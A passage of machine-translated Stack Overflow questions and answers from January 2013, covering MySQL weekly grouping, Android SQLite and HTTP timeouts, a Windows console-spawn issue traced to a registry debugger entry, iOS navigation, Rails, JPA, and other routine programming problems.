> 时间：2013-01-17T13:34:15.553

```
SELECT 
    1 + DATEDIFF(columnDate, @start_date) DIV 7  AS weekNumber
  , @start_date + INTERVAL (DATEDIFF(columnDate, @start_date) DIV 7) WEEK
      AS week_start_date
  , MIN(columnDate) AS actual_first_date
  , MAX(columnDate) AS actual_last_date
  , SUM(otherColumn)
  , AVG(otherColumn)
  --- 
FROM 
    tableX 
WHERE 
    columnDate >= @start_date 
GROUP BY
    DATEDIFF(columnDate, @start_date) DIV 7 ; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T12:46:14.307

```
SELECT *
FROM  `table` 
GROUP BY WEEK( ADDDATE( `date_column` , WEEKDAY(NOW()) ) ) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:41:50.973

```
SELECT users.* from users 
WHERE created_at >= '2011-12-01' 
AND created_at <= date_add('2011-12-01', INTERVAL 7 DAY) 
```

这将选择在 201-12-01 和 7 天之后创建的用户。进行更改，根据您的需要进行查询。

# android - 如何使用 SQlitedatabase 解决 Java.lang.StringOutOfBound 异常

> ID：14379338
> 
> 赞同：0
> 
> 时间：2013-01-17T12:39:45.480
> 
> 标签：android, android-sqlite

我运行以下代码并获得**Java.lang.StringOutOfBound Exception**

```
 SQLiteDatabase sb;
     String g="o";
    String []gt={"0"};
     try {
        sb=SQLiteDatabase.openDatabase("data/data/com.example.datatestx/ma", null, SQLiteDatabase.CREATE_IF_NECESSARY);

        sb.execSQL("create table if not exists blac  (" + " phone text  , " + " ftime  text, " + " ttime text );  "    );

        sb.execSQL( "insert into blac(phone, ftime,ttime) values ('01741297133', '333333','33333' );"  );
        sb.execSQL( "insert into blac(phone, ftime,ttime) values ('01761233433', '777' ,'77777');"  );
        sb.execSQL( "insert into blac(phone, ftime,ttime) values ('01712333333', '999','33433' );"  );
        //Cursor c1 = sb.rawQuery( "select * from blac where phone=?", gt);
        String gb="33"; 
        String gh = "SELECT * FROM blac where( phone like '%"+gb+" ')"+"ORDER BY phone";
        Cursor c1 = sb.rawQuery( gh,null);
    if(c1.getCount()>0){

    c1.moveToFirst();
    do {
        g=g+c1.getString(c1.getColumnIndex("phone"));

    }while(c1.moveToNext());
    }  c1.close();
        sb.close();

         Toast.makeText(getApplicationContext(), "Success!"+g, Toast.LENGTH_LONG).show();   
    }
    catch (Exception e)
    {

    Toast.makeText(getApplicationContext(), e.toString(), Toast.LENGTH_LONG).show();     
    } 
```

但是在运行代码之后.. o **g**的值没有改变，请这里的任何人帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:31:32.433

您想从“电话”列中获取字符串，但据我所知，您没有创建这样的列：

```
 g=g+c1.getString(c1.getColumnIndex("phone")); 
```

如果您的列有字符串常量，那么您以错误的方式编写您的 execSQL：

```
 sb.execSQL("create table if not exists blac  (" + " phone text  , " + " ftime  text, " + " ttime text );  "    ); 
```

你必须这样写：

```
 sb.execSQL("create table if not exists blac  (" +  phone +" text  , " +  ftime +" text, " +  ttime +" text );  "    ); 
```

# android - 当我的android端服务器关闭时如何处理这种情况

> ID：14379340
> 
> 赞同：1
> 
> 时间：2013-01-17T12:39:52.303
> 
> 标签：android, http-post

这是我的 doInBackground() 方法，我在其中调用了其他类中的 makeHttpRequest() 方法。

```
 protected String doInBackground(Integer... args) {
            // Building Parameters

            String parameter1 = "tenant";
                String parameter2 = "price";

            List<NameValuePair> params = new ArrayList<NameValuePair>();

                params.add(new BasicNameValuePair("person",parameter1));
                        params.add(new BasicNameValuePair("price",parameter2));

            JSONObject json = jParser.makeHttpRequest(requiredurl, "POST", params);

            Log.d("Details", json.toString());

                int success = json.getInt("connected");

                if (success == 1) {

                    //blah blah
                      }
        } 
```

**makeHttpRequest() 方法：**

```
public JSONObject makeHttpRequest(String url, String method,
            List<NameValuePair> params) {

        // Making HTTP request
        try {

            // check for request method
            if(method == "POST"){

                // defaultHttpClient
                DefaultHttpClient httpClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost(url);
                httpPost.setEntity(new UrlEncodedFormEntity(params));

                HttpResponse httpResponse = httpClient.execute(httpPost);

                HttpEntity httpEntity = httpResponse.getEntity();
                is = httpEntity.getContent();

            }       

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

       ................
       ....................... // Here the result is extracted and made it to json object
       .............................

        // return JSON 
        return jObj;  // returning the json object to the method that calls.

    } 
```

因此，通过上面的代码，对服务器的实际调用是通过这一行进行的 -> `HttpResponse httpResponse = httpClient.execute(httpPost);`

当我的服务器启动时，一切正常，但是当它关​​闭时，进度条会不断加载。我想处理这种情况。做了很多搜索，但只能找到这篇[文章](https://stackoverflow.com/questions/14109473/handling-server-down-while-calling-rest-web-services)。这看起来很适合我的情况，因为即使我的想法是等待 10 秒来获得响应，如果超过了超时时间，我需要处理它以在 catch 块中显示消息。但我无法根据我的代码实现它。有人可以帮我吗？我将非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:45:06.663

您的异常没有受到影响，因为 HttpClient 没有引发异常。也许您的 HttpResponse 代码中出现错误，例如 500。在您的 try 块中，添加以下行：

```
response.getStatusLine().getStatusCode() 
```

然后读取状态码。如果您的 Web 服务器启动，您应该得到 200 OK，但如果它关闭，您可能会得到 500 或其他结果。然后，您可以在此处处理需要隐藏旋转进度条的代码，并且可以显示错误消息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:42:57.943

在执行 url 之前添加以下代码。

```
HttpParams httpParameters = new BasicHttpParams();
HttpConnectionParams.setConnectionTimeout(httpParameters, 30000);
HttpConnectionParams.setSoTimeout(httpParameters, 30000);
DefaultHttpClient httpClient = new DefaultHttpClient(httpParameters); 
```

将上面的代码写在 try 块和 Catch`ConnectTimeOutException`和`SocketConnectionTimeOutException`. 您可以在其中显示一些自定义对话框。

也可以通过查看 HttpClient Response 的状态行来判断。

# windows - MSVC2008 c/c++ 控制台应用程序产生新的控制台

> ID：14379345
> 
> 赞同：2
> 
> 时间：2013-01-17T12:40:09.633
> 
> 标签：windows, visual-studio-2008, console-application, msvcrt

应用程序在哪里决定/导致生成新的控制台窗口（动态链接时）？是否有一些我可能忽略的定义或编译指示或默认运行时 dll 中的标准行为发生了一些变化？我不太确定这些是要问的正确问题，请阅读下面的背景并耐心等待。我很高兴每一次朝着正确的方向轻推。

背景：控制台应用程序 (/SUBSYSTEM:CONSOLE) 在启动时会产生一个新的子控制台。使用相同源和配置设置的其他应用程序不会。唯一的区别（似乎）是提供的 3rd-party-dll。由于新的子控制台，我无法再重定向输出（app.exe > dump.txt）。重定向对于此应用程序至关重要。

我正在 MS Visual Studio 2008 上构建该 c/c++ 控制台应用程序。该应用程序动态链接到大量混乱的 dll。整个库包由一个第 3 方作为发布版本提供，没有调试信息。dll 包包括 msvcr90.dll (9.0.30729.1) msvcp90.dll (9.0.30729.1) 和 msvcr80.dll (8.0.50727.42)。

无论导致这似乎是非常全局的，因为第一个 fprintf 到 stdout 或 main() 中的 stderr 进入新的控制台窗口，而不是启动应用程序的 shell。

在我的第一次尝试中，我在 Visual Studio 2005（我们一直使用到最新版本的库包）和 2010（由 dll 提供者推荐）上构建了应用程序。这些构建没有产生控制台，但在释放可能在不同版本的运行时中分配的内存时确实崩溃了。使用 Dependency Walker，我可以找到链接 dll 的“主”运行时。

PS：Afaik 链接到 2 个不同的运行时已经足够危险了。但它是对先前版本的 dll-pack 的改进，其中包括 71、80、90 运行时 dll 的 r、c 和 m 变体。

PPS：我之前主要在linux上开发，所以我可能会犯一些非常基本的错误。请提前接受我对我的无知的歉意。

**更新1：**

按照 Anton Kovalenko 的建议，我削减了越来越多的库。然后我删除了更多代码。最后我结束了：

```
#include <stdio.h>
#include <Windows.h>

int main(int _argc, char **_argv)
{
printf("application running ...\n");
fflush(stdout);
Sleep(2000);
exit(0);
} 
```

配置属性 > c/c++ > 命令行：

```
/Od /Ob2 /D "_MBCS" /FD /EHsc /MD /Fo"a4input_interface_6.12_1.dir\Release\\" /Fd"a4input_interface_6.12_1.dir\Release\vc90.pdb" /W3 /nologo /c /TC /errorReport:prompt 
```

配置属性 > 链接器 > 命令行：

```
/OUT:"D:\sascha\svn\a4_devel\cmakebuild\build\win32_release\inputinterfaces\.inter_612_1_32.exe" /VERSION:0.0 /INCREMENTAL:NO /NOLOGO /MANIFEST /MANIFESTFILE:"a4input_interface_6.12_1.dir\Release\.inter_612_1_32.exe.intermediate.manifest" /MANIFESTUAC:"level='asInvoker' uiAccess='false'" /SUBSYSTEM:CONSOLE /DYNAMICBASE:NO /ERRORREPORT:PROMPT kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib 
```

配置属性 > 清单工具 > 命令行

```
/nologo /outputresource:"..\..\..\build\win32_release\inputinterfaces\.inter_612_1_32.exe;#1" 
```

我仍然有一个问题，即生成了一个 shell 并且无法使用（即 app.exe > test.txt）重定向标准输出。所以文本“应用程序正在运行......”不会打印在启动 exe 的同一个 shell 上。

我仍然一无所知，仍然感谢每一个提示。

**更新 2：**

我为命令行创建了一个批处理文件。如果我用它编译它，则 exe 按预期工作。

```
cl.exe /Od /Ob2 /D "_MBCS" /FD /EHsc /MD /Fo"a4input_interface_6.12_1.dir\Release\\" /Fd"a4input_interface_6.12_1.dir\Release\vc90.pdb" /W3 /nologo /c /TC /errorReport:prompt main.c

link.exe /OUT:"D:\sascha\svn\a4_devel\cmakebuild\build\win32_release\inputinterfaces\.inter_612_1_32.exe" /VERSION:0.0 /INCREMENTAL:NO /NOLOGO /MANIFEST /MANIFESTFILE:"a4input_interface_6.12_1.dir\Release\.inter_612_1_32.exe.intermediate.manifest" /MANIFESTUAC:"level='asInvoker' uiAccess='false'" /SUBSYSTEM:CONSOLE /DYNAMICBASE:NO /ERRORREPORT:PROMPT kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib a4input_interface_6.12_1.dir\Release\main.obj

mt.exe /manifest a4input_interface_6.12_1.dir\Release\.inter_612_1_32.exe.intermediate.manifest /nologo /outputresource:"D:\sascha\svn\a4_devel\cmakebuild\build\win32_release\inputinterfaces\.inter_612_1_32.exe";#1" 
```

因此，Visual Studio 所做的某些事情并未反映在它提供的命令行中。什么和为什么？我仍然一无所知，仍然感谢每一个提示。

**解决方案：** 为这个名称的可执行文件配置了一个调试器。这就是为什么我有这种行为：

*   inter_612_2_32.exe 没有子外壳
*   intes_612_2_32.exe 没有子外壳
*   inter_612_1_32.exe 生成子外壳
*   intes_612_1_32.exe 没有子外壳

使用 ProcessExplorer 我发现 inter_612_1_32.exe 是 DbgHost.exe 的子进程。不幸的是，我没有遵循那个领导并忘记了它。

加载的 Dll 实际上并不重要。问题是注册表中的一个条目：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\inter_612_1_32.exe

我猜该条目是由 DebugDiag、Application Verifier 或其他工具创建的，但在工具的 GUI 中删除时并未删除。

感谢所有考虑过的人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:47:51.690

一些第三方dll可能正在调用`FreeConsole`and `AllocConsole`，有你描述的效果。如果它在`DllMain`for中完成`DLL_PROCESS_ATTACH`，它将在输入`main()`作为您的项目依赖项的库之前发生。

似乎没有与您的构建环境相关的替代解释。

如果您创建一个将`LoadLibrary`用于可疑 dll 而不是链接到其导入库的项目，您可以了解更多信息：如果其中一些（或*它们的*依赖项）确实`FreeConsole`和`AllocConsole`in `DllMain`，它将在`LoadLibrary`调用期间发生。

# iphone - Iphone SDK 中的导航问题

> ID：14379347
> 
> 赞同：0
> 
> 时间：2013-01-17T12:40:14.900
> 
> 标签：iphone, ios, objective-c, xcode, uinavigationcontroller

我有一个视图（HomeView），我在其中打开了一个 popOver。popoVer 内容视图是 (ListView)，其中包含一个表视图。

现在，当我选择该行时，HomeView 将关闭并打开一个新视图（MapView）。

到目前为止，它工作正常。但是我的所有视图都包含 xib 中的标签栏。我在 ListView 中没有标签栏。

所以，我只是用当前的模态视图打开 MapView。但是从那以后我的导航不起作用。

我的代码如下。

**HomeView.m**

//用ListView打开popview

```
-(IBAction)btnTableMenu_TouchUpInside:(id)sender{

ListView *popUp=[[ListView alloc] initWithNibName:@"ListView" bundle:nil];

    popView = [[UIPopoverController alloc]initWithContentViewController:popUp];
    popView.delegate =self;

    [popView setPopoverContentSize:CGSizeMake(300, 700)];
    [popView presentPopoverFromRect:CGRectMake(150,25,20,50) inView:self.view permittedArrowDirections:UIPopoverArrowDirectionUp animated:YES];
} 
```

**列表视图.m**

```
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
   [[NSNotificationCenter defaultCenter] postNotificationName:@"DismissModal"object:self];

    MapViewController *mapVC=[[MapViewController alloc]initWithNibName:@"MapViewController_ipad" bundle:nil];
    [self presentModalViewController:mapVC animated:YES];
    //[self.navigationController pushViewController:mapVC animated:YES];
} 
```

**我该如何解决这个问题？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:47:15.927

你只是这样做： -

```
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
   [[NSNotificationCenter defaultCenter] postNotificationName:@"DismissModal"object:self];

    MapViewController *mapVC=[[MapViewController alloc]initWithNibName:@"MapViewController_ipad" bundle:nil]; 
    UINavigationController *navbar = [[UINavigationController alloc] initWithRootViewController:mapVC];
    navbar.navigationBar.tintColor =[UIColor colorWithRed:255/255.0 green:108/255.0 blue:61/255.0 alpha:0.1];

    [navbar setModalPresentationStyle:UIModalPresentationFormSheet];
    [navbar setModalTransitionStyle:UIModalTransitionStyleFlipHorizontal];

    [self presentModalViewController:navbar animated:YES];

} 
```

在`MapViewController.m`文件中`ViewDidLoad`

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    UIBarButtonItem *CancleButton = [[UIBarButtonItem alloc] initWithTitle:@"Cancel" style:UIBarButtonItemStyleBordered target:self action:@selector(cancel)];
    self.navigationItem.leftBarButtonItem = CancleButton;

}

-(void)cancel
{

    [self dismissModalViewControllerAnimated:YES];  

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:07:57.527

顺便说一句，你知道区别.. `[self presentModalViewController:controller animated:YES];` &`[self.navigationController pushViewController:controller animated:YES];`

\当您执行 presentModalViewController:controller 时，您丢失了最后一个导航堆栈。您需要创建不同的导航控制器来呈现视图。正确阅读此内容，您将获得 Idea。

[http://developer.apple.com/library/ios/#featuredarticles/ViewControllerPGforiPhoneOS/Introduction/Introduction.html](http://developer.apple.com/library/ios/#featuredarticles/ViewControllerPGforiPhoneOS/Introduction/Introduction.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:56:34.473

尝试遵循这些-

**列表视图.m**

```
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
   [[NSNotificationCenter defaultCenter] postNotificationName:@"DismissModal"object:self userInfo:[NSDictionary dictionaryWithObject:@"map" forKey:@"selectedView"]];
} 
```

**HomeView.m**

```
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(dismissModal:) name:@"DismissModal" object:nil];

- (void) dismissModal:(NSNotification *)notification
{
    [self dismissModalViewController:mapVC animated:NO];

    if([[notification.userInfo valueForKey:@"selectedView"] isEqualToString:@"map"])
    {
        MapViewController *mapVC=[[MapViewController alloc]initWithNibName:@"MapViewController_ipad" bundle:nil]; 
        UINavigationController *navController = [[UINavigationController alloc] initWithRootViewController:mapVC];
        [self presentModalViewController:navController animated:YES];
    }
} 
```

# ruby-on-rails-3 - 针对 ContacUs 页面的 rails 控制器模型视图建议

> ID：14379348
> 
> 赞同：0
> 
> 时间：2013-01-17T12:40:16.780
> 
> 标签：ruby-on-rails-3, email, model, controller

我有一个用 rails 3 编写的简单静态网站。

该站点有一个称为页面的控制器，每个静态页面都用作视图。例如页面/主页、页面/关于、页面/价格等。这一切都很好。

我现在遇到了一个问题，我需要添加一个简单的联系方式功能，但我正在努力让我的头脑了解模型/控制器/视图。

我已经有一个带有contactus 视图的页面控制器，该视图具有详细地址等。现在我需要以某种方式将消息模型放入contactus 视图中，以便我可以填充模型属性并发送电子邮件。

我可以/我应该从 Pages Controller 中创建一个新的消息模型吗？

```
 class PagesController < ApplicationController

  def contact

   def new
    @message  = Message.new
   end

   def create
     @message = Message.new(params[:message])
     if @message.valid?
      # TO DO send message here using OS mail program.

      redirect_to root_url, notice: "Message sent! Thank you for contacting us."
     else
       render "new"
     end  
    end
  end

  def about

  end

  def products

  end

  def portfolio

  end

  def services

  end

end 
```

或者我应该从 pages 控制器中取出 contactus 视图并制作名为 messages 的新控制器？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T15:08:05.313

我会有一个单独的控制器，称为联系人，例如使用 new 和 create 操作

```
def new
@message = Message.new
end

def create
@message = Message.new(params[:message])
if @message.valid?
  NotificationsMailer.new_message(@message).deliver
  redirect_to(root_path, :notice => "Message was successfully sent.")
else
  flash.now.alert = "Please fill all fields."
  render :new
end
end 

end 
```

然后是一个单独的模型来处理您的消息

```
 class Message 
 include ActiveModel::Validations
 include ActiveModel::Conversion
 extend ActiveModel::Naming

 attr_accessor :name, :email, :subject, :body, :file

 validates :name, :email, :subject, :body, :presence => true
 validates :email, :format => { :with => %r{.+@.+\..+} }, :allow_blank => true

 end 
```

你的属性可以是你喜欢的任何东西，显然这只是你可以做的一个例子

# php - 将 php 变量转换为 javascript 变量

> ID：14379362
> 
> 赞同：1
> 
> 时间：2013-01-17T12:41:02.157
> 
> 标签：php, javascript, html

我已经合并了这个简单的 datetimepicker：[http ://trentrichardson.com/examples/timepicker/#rest_examples](http://trentrichardson.com/examples/timepicker/#rest_examples)

所以看起来

```
<?php $tabname = "brightness"; ?>
<script type="text/javascript">
$('#datumstartbrightness').timepicker();
</script>
...
<input type="text" name="datumstart<?php echo $tabname; ?>" 
                id="datumstart<?php echo    $tabname; ?>"/> 
... 
```

使用此代码它可以工作并出现 datetimepicker ！

但是有了这个...

```
<?php $tabname = "brightness"; ?>
<script type="text/javascript">
$('#datumstart<?php echo $tabname; ?>').timepicker();
</script>
...
<input type="text" name="datumstart<?php echo $tabname; ?>" id="datumstart<?php echo     $tabname; ?>"/> 
... 
```

DateTimePicker 没有出现。这条线有什么问题

**$('#datumstart').timepicker();**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:52:31.957

在调用 jQuery-Functions 之前，您需要先完成就绪状态：所以试试这个：

```
<script type="text/javascript">
$(function() {
   $('#datumstart<?php echo $tabname; ?>').timepicker();
});
</script> 
```

# jakarta-ee - 具有抽象类继承的 JPA 实体

> ID：14379365
> 
> 赞同：6
> 
> 时间：2013-01-17T12:41:09.020
> 
> 标签：jakarta-ee, ejb, jboss7.x

我有一个抽象类，它提供了一些要继承的 EJB 实体的一些通用功能。其中之一是时间戳列。

```
public abstract class AbstractEntity {

    ...
    private long lastModified;
    ...

    @Column
    public long getLastModified() {
        return lastModified;
    }

    public void setLastModified(long ts) {
       lastModified = ts;
    }
} 
```

和

```
@Table
@Entity
public class MyEntity extends AbstractEntity {
    ...
    private Long key;
    private String value;
    ...

    @Id
    public Long getKey() {
        return key;
    }

    public void setKey(Long k) {
        key = k;
    }

    @Column
    public String getValue() {
        return value;
    }

    public void setValue(String txt) {
        value = txt;
        setLastModified(System.currentTimeMillis());
    }
} 
```

问题是时间戳列未添加到数据库表中。是否需要将一些注释添加到 AbstractEntity 以便将 lastModified 字段作为列继承？

我尝试将 @Entity 添加到 AbstractEntity 但这导致部署时出现异常。

```
org.hibernate.AnnotationException: No identifier specified for entity:
AbstractEntity 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-01-17T12:53:58.480

您在这里有几种可能性。

您没有为您的超类定义映射。如果它应该是一个可查询的类型，你应该用它来注释它，`@Entity`你还需要一个`@Id`属性（这个缺失的属性是你在添加注释`@Id`后得到错误的原因 ）`@Entity`

如果您不需要抽象超类成为可查询实体，但希望将其属性作为其子类的表中的列，则需要使用`@MappedSuperclass`

如果你根本不注释你的超类，它被提供者认为是瞬态的，根本没有映射。

**编辑：**顺便说一句，您不必`lastModified`自己修改值（除非您真的想要） - 您可以让持久性提供者在每次使用生命周期回调持久化实体时为您执行此操作：

```
@PreUpdate
void updateModificationTimestamp() {
 lastModified = System.currentTimeMillis();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T13:09:57.277

您必须在 AbstractEntity 类的上方指定 @MappedSuperclass 注释。这意味着您指定在 AbstractEntity 类中注释的任何部分都是您扩展此类的类的一部分。

而且您还需要注意 jdbc 表 - 映射的列名。

# mysql - Mysql加入限制

> ID：14379367
> 
> 赞同：0
> 
> 时间：2013-01-17T12:41:10.223
> 
> 标签：mysql

我的查询是这样的......

```
SELECT tb1.name, COUNT(tb2.payment_date) as first_payment FROM table1 LEFT JOIN table2 tb2 ON tb2.id_user = tb1.id

+-----------+-------------+
| Name      |  Count      |
+-----------+-------------+
| John      |   543534543 | 
```

但我希望我的查询返回连接限制，例如：

```
LEFT JOIN tb2 ON tb2.id_user = tb1.id { LIMIT JOIN } 
```

只返回一个关系......

```
+-----------+-------------+
| Name      |  Count      |
+-----------+-------------+
| John      |   3         | 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:48:01.220

```
select tb1.name, count(*) as first_payment
from table1 t1
LEFT JOIN (SELECT id_user, min(payment_date) 
           FROM table2
           GROUP BY id_user) as t2
ON t1.id = t2.id_user
GROUP BY tb1.name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:43:19.557

```
SELECT 
    tb1.name, 
    COUNT(tb2.payment_date) as first_payment 
FROM table1 
LEFT JOIN (SELECT id_user , MIN(id) FROM table2 GROUP BY id_user)as tb2 ON tb2.id_user = tb1.id 
```

# ios - 格式字符串未使用数据参数，但工作正常

> ID：14379371
> 
> 赞同：0
> 
> 时间：2013-01-17T12:41:21.797
> 
> 标签：ios, uiwebview, nsstring

我使用了 Stack Overflow 问题中的这段代码：[URLWithString: 返回 nil](https://stackoverflow.com/questions/1981390/urlwithstring-returns-nil)：

```
//localisationName is a arbitrary string here
NSString* webName = [localisationName stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; 
NSString* stringURL = [NSString stringWithFormat:@"http://maps.google.com/maps/geo?q=%@,Montréal,Communauté-Urbaine-de-Montréal,Québec,Canadae&output=csv&oe=utf8&sensor=false", webName];
NSString* webStringURL = [stringURL stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
NSURL* url = [NSURL URLWithString:webStringURL]; 
```

当我将它复制到我的代码中时，没有任何问题，但是当我修改它以使用我的 url 时，我遇到了这个问题：

> 格式字符串未使用数据参数。

但它工作正常。在我的项目中：

。H：

```
NSString *localisationName; 
```

米：

```
NSString* webName = [localisationName stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
NSString* stringURL = [NSString stringWithFormat:@"http://en.wikipedia.org/wiki/Hősök_tere", webName];
NSString* webStringURL = [stringURL stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
NSURL* url = [NSURL URLWithString:webStringURL];

[_webView loadRequest:[NSURLRequest requestWithURL:url]]; 
```

我该如何解决这个问题？我的代码有什么遗漏吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:28:26.933

原始`@`字符串中的 用作`webName`插入值的占位符。在您的代码中，您没有这样的占位符，因此您告诉它放入`webName`您的字符串中，但您没有说在哪里。

如果您不想插入`webName`字符串，那么您的一半代码是多余的。所有你需要的是：

```
NSString* stringURL = @"http://en.wikipedia.org/wiki/Hősök_tere";
NSString* webStringURL = [stringURL stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];
NSURL* url = [NSURL URLWithString:webStringURL];

[_webView loadRequest:[NSURLRequest requestWithURL:url]]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:37:59.217

该`+stringWithFormat:`方法将[返回使用给定格式字符串创建的字符串作为模板，其余参数值将被替换到该模板中](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html#//apple_ref/occ/clm/NSString/stringWithFormat%3a)。并且在第一个代码块中，`%@`将被替换为`webName`.

在您的修改版本中，***格式***参数即`@"http://en.wikipedia.org/wiki/Hősök_tere"`不包含任何*[格式说明符](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Strings/Articles/formatSpecifiers.html#//apple_ref/doc/uid/TP40004265-SW1)*，因此

> > `NSString* stringURL = [NSString stringWithFormat:@"http://en.wikipedia.org/wiki/Hősök_tere", webName];`

就像这样运行[（带有警告`Data argument not used by format string.`）]：

> > `NSString* stringURL = @"http://en.wikipedia.org/wiki/Hősök_tere";`

# jquery - 是否可以在 onbeforeunload 触发调用的同时显示 jquery 弹出窗口？

> ID：14379375
> 
> 赞同：2
> 
> 时间：2013-01-17T12:41:30.013
> 
> 标签：jquery, popup, window, onbeforeunload

这可以在 onbeforeunload 事件调用时打开 jquery 弹出窗口吗？

请在此处检查图像 url 我有带有一个按钮和谷歌链接的 html 内容。现在，当我单击选项卡或窗口关闭时，我需要在窗口确认框下显示 jquery 弹出窗口以离开或留在页面上。

[http://staging.jigmogroup.com/dvs/win_confirm.png](http://staging.jigmogroup.com/dvs/win_confirm.png)

最后我在这里提出了解决方案：

我得到了解决方案，我们可以调用 javascript 函数而不是 jquery。喜欢

```
var leave_message = 'You sure you want to leave?'
function goodbye() {

    //load popup
    loadPopup();
    centerPopup();

    return leave_message;
}
window.onbeforeunload=goodbye; 
```

我们可以调用javascript函数而不是jquery，所以它可以工作

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:46:08.087

不，这是不可能的。

`onbeforeunload`只能返回在本机浏览器警报窗口中发出警报的字符串，并为用户提供继续与否的选项。事实上，Firefox 甚至不会打印出这个字符串。

# java - 如何获取日期数据类型中没有时间戳的系统日期？

> ID：14379385
> 
> 赞同：0
> 
> 时间：2013-01-17T12:42:02.713
> 
> 标签：java, string, date, comparison

我需要比较两个日期 task.deadline 具有 Date 数据类型，但是当我获取系统日期时，它会在字符串中为我提供如何获取 Date 数据类型中的系统日期

```
if (!task.deadline.before(systemDate)) {
            // add row to to do tab
            model_1.addRow(row);
        } else {
            // add row to done tab
            model_2.addRow(row);
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:52:01.857

解析`systemDate`到日期

`SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
Date sysDate = sdf.parse(systemDate);`

现在您可以`sysDate`在比较中使用。

# java - OpenJpa 合并分离对象

> ID：14379391
> 
> 赞同：1
> 
> 时间：2013-01-17T12:42:12.487
> 
> 标签：java, jpa, openjpa

我想知道我使用 OpenJpa 2 保存实体的方式是否正确。

我从我反序列化的休息服务接收对象，然后保存此实例：

1.  开始交易
2.  从数据库中检索实例（即使我已经有了这个实例）
3.  将分离实例的属性复制到从数据库检索到的实例
4.  调用合并
5.  提交交易

如果是带有compsitions的复杂实体模型，那就太痛苦了！

```
public boolean save(Collection<Event> events) throws DataException {

    if (events == null) {
        throw new DataException("Cannot save null events");
    }

    EntityManager em = getEntityManager();
    try {
        em.getTransaction().begin();
        for (Event event : events) {

            boolean add = true;

            if(event.getKey() > 0){
                Event previousEvent = em.find(Event.class, event.getKey());
                if (previousEvent != null) {
                    //update
                    previousEvent.setTitle(event.getTitle());
                    previousEvent.setDate(event.getDate());
                    previousEvent.setDescription(event.getDescription());

                    List<Member> participants = new ArrayList<>();
                    for(Member m : event.getParticipants()){
                        Member participant = em.find(Member.class, m.getKey());
                        if(participant != null){
                            participants.add(participant);
                        }
                    }
                    previousEvent.setParticipants(participants);

                    List<Member> registrants = new ArrayList<>();
                    for(Member m : event.getRegistrants()){
                        Member registrant = em.find(Member.class, m.getKey());
                        if(registrant != null){
                            participants.add(registrant);
                        }
                    }
                    previousEvent.setRegistrants(registrants);

                    em.merge(previousEvent);
                    add = false;
                } 
            } 
            if(add) {
                //add
                em.persist(event);
            }
        }
        em.getTransaction().commit();

    } catch (PersistenceException pe) {
        pe.printStackTrace();
        throw new DataException("An error occured while saving the event", pe);
    } finally {
        em.close();
    }
    return true;
} 
```

有什么建议吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T14:26:48.263

根据 Chris 的评论 - 您应该能够调用`em.merge(event)`并让 JPA 处理所有这一切。如果需要，它应该自动处理创建新事件行、更新事件属性以及更新或创建包含的对象。

# linux - AWS EC2 实例应用程序日志

> ID：14379392
> 
> 赞同：1
> 
> 时间：2013-01-17T12:42:15.110
> 
> 标签：linux, logging, amazon-web-services, ubuntu-12.04

我想将 uWSGI（“/var/log/uwsgi/uwsgi.log”）等应用程序的日志存储在可以从多个实例访问的设备上，并且可以将它们的日志保存到该特定设备下的实例名称目录下。

AWS 也提供任何解决方案来做到这一点......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T16:49:37.297

您可以在此处采用多种方法。如果您想获得类似直接写入文件系统的体验，那么您可以考虑使用[s3fs](http://code.google.com/p/s3fs/ "s3fs")之类的东西将一个通用 S3 存储桶挂载到您的每个实例。这将或多或少地为您提供实时日志合并，但老实说，我会担心这种设置在大容量应用程序中的性能。

